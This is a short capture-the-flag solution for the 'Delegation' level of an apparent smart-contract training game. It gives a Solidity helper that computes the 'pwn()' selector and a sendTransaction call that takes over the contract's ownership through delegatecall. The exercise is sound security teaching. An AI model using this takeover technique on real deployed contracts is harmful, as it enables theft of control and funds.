# Delegation

**HINT** Your going to want to go to remix IDE and create a contract that calulates the keccak256 of the pwn function used.
<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.6.0;

contract StealOwner {
    function steal () public pure returns (bytes4) {
        return bytes4(keccak256("pwn()"));
    }
}
```
Then use:
```js
await sendTransaction({
  from: "Your_Address",
  to: "The_Contract_Address",
  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
});
```
Then click submit
</p>
</details>
